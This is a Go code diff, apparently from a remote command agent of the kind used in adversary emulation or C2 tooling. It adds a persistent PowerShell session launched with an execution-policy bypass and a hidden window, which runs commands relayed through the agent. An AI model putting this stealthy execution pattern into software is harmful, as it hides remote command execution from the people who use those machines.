@@ -14,6 +14,8 @@ import (
 	"mime/multipart"
  )
 
+var shell Shell
+
  //RunCommand executes a given command
  func RunCommand(message string, httpServer string, profile map[string]interface{}) ([]byte, int) {
    if strings.HasPrefix(message, "cd") {
@@ -35,23 +37,41 @@ import (
 }
 
  func execute(command string, executor string) ([]byte, int) {
-	var bites []byte
-	var error error
-	var status int
-	if runtime.GOOS == "windows" {
-	    if executor == "cmd" {
-	    	bites, error = exec.Command("cmd.exe", "/c", command).Output()
-	    } else {
-	    	bites, error = exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
-	    }
+ 	if executor == "psh" {
+ 		if shell.handle == nil {
+			if runtime.GOOS == "windows" {
+				if executor == "psh" {
+					shell, _ = StartShell("powershell.exe", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-NoExit", "-C", "-")
+					defer shell.Exit("exit")
+				}
+			}
+		} else {
+			status := 0
+			stdout, stderr, err := shell.Run(command)
+			if err != nil {
+				status = 1
+			}
+			return []byte(fmt.Sprintf("%s%s%s", stdout, stderr, "\n")), status
+		}
 	} else {
-	   bites, error = exec.Command("sh", "-c", command).Output()
-    }
-    if error != nil {
-	   bites = []byte(string(error.Error()))
-	   status = 1
+		var bites []byte
+		var error error
+		var status int
+		if runtime.GOOS == "windows" {
+			if executor == "cmd" {
+				bites, error = exec.Command("cmd.exe", "/c", command).Output()
+			} else {
+				bites, error = exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
+			}
+		} else {
+			bites, error = exec.Command("sh", "-c", command).Output()
+		}
+		if error != nil {
+			bites = []byte(string(error.Error()))
+			status = 1
+		}
+		return []byte(fmt.Sprintf("%s%s", bites, "\n")), status
 	}
-	return []byte(fmt.Sprintf("%s%s", bites, "\n")), status
 }
 
 func changeDirectory(target string) []byte {
